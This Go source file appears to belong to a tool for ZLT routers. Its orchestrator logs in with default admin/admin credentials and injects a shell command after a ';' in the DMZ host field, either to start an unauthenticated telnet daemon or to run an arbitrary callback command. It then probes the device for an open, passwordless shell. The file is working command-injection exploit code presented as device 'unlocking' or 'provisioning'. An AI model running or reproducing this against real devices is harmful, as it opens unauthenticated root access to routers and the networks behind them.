package zlt

import (
	"fmt"
	"strings"
	"time"
)

// UnlockOptions controls the provisioning flow.
type UnlockOptions struct {
	// Username / Password are the web credentials. Defaults admin/admin.
	Username string
	Password string
	// DMZHost is a plausible DMZ address to place in front of the ';'.
	DMZHost string
	// Mode is one of ShellModeTelnet / ShellModeTelnetAlt / ShellModeCallback.
	Mode string
	// Port is the port the injected daemon should listen on (telnet modes).
	Port int
	// Command is used with ShellModeCallback.
	Command string
	// ProbeTimeout bounds each network operation.
	ProbeTimeout time.Duration
}

// UnlockResult reports what happened.
type UnlockResult struct {
	LoggedIn  bool
	Level     string
	Token     string
	Payload   map[string]any
	Response  GenericResponse
	RawReply  string
	Shells    []ShellState
	Succeeded bool
	Notes     []string
}

// BuildPayload assembles the body for the selected mode.
func (o UnlockOptions) BuildPayload(sessionID string) (map[string]any, error) {
	switch o.Mode {
	case ShellModeTelnet, ShellModeTelnetAlt:
		return DMZPayload(sessionID, o.DMZHost, TelnetCommand(o.Port))
	case ShellModeCallback:
		return CommandPayload(sessionID, o.DMZHost, o.Command)
	default:
		return nil, fmt.Errorf("zlt: unknown mode %q", o.Mode)
	}
}

// UnlockOrchestrator performs login, injection and verification.
type UnlockOrchestrator struct {
	Client *Client
	Host   string
	Opts   UnlockOptions
}

// Run executes the flow and returns a detailed result. A returned error means a
// hard failure (couldn't log in, couldn't build a payload); a nil error with
// Succeeded=false means the request was sent but verification failed.
func (u *UnlockOrchestrator) Run() (UnlockResult, error) {
	res := UnlockResult{Shells: nil}

	login, err := u.Client.Login(u.Opts.Username, u.Opts.Password)
	if err != nil {
		return res, fmt.Errorf("login: %w", err)
	}
	if !login.Authed() {
		return res, fmt.Errorf("login rejected: message=%q success=%q", login.Message, login.Success)
	}
	res.LoggedIn = true
	res.Level = u.Client.Level

	// Refuse to aim a config write at a device we only reached as a low-priv
	// account if the caller explicitly asked for superadmin.
	if u.Opts.Username == superUserName && res.Level != "" && res.Level == "1" {
		res.Notes = append(res.Notes, "logged in as "+superUserName+" but device reports level 1")
	}

	payload, err := u.Opts.BuildPayload(u.Client.SessionID)
	if err != nil {
		return res, err
	}
	res.Payload = payload

	raw, err := u.Client.Do(CmdNetworkService, "POST", payload)
	if err != nil {
		// The device frequently closes the connection instead of replying when
		// the injected daemon is spawned; treat that as "sent, verify anyway".
		res.Notes = append(res.Notes, fmt.Sprintf("request did not return cleanly: %v", err))
	} else {
		res.RawReply = strings.TrimSpace(string(raw))
		var g GenericResponse
		if strings.Contains(res.RawReply, "\"success\":true") {
			g.Success = true
		}
		if strings.Contains(res.RawReply, noAuthMarker) {
			return res, fmt.Errorf("device rejected the session (%s) - credentials or session id wrong", noAuthMarker)
		}
		res.Response = g
	}

	// Give the daemon a moment to bind before verifying.
	time.Sleep(2 * time.Second)

	port := u.Opts.Port
	if u.Opts.Mode == ShellModeCallback {
		port = 23
	}
	st := ProbeShell(u.Host, port, u.Opts.ProbeTimeout)
	res.Shells = append(res.Shells, st)
	res.Succeeded = st.Open && st.NoAuth

	return res, nil
}

// VerifyOnly probes without injecting. Useful against devices that were already
// provisioned.
func VerifyOnly(host string, ports []int, timeout time.Duration) []ShellState {
	out := make([]ShellState, 0, len(ports))
	for _, p := range ports {
		out = append(out, ProbeShell(host, p, timeout))
	}
	return out
}
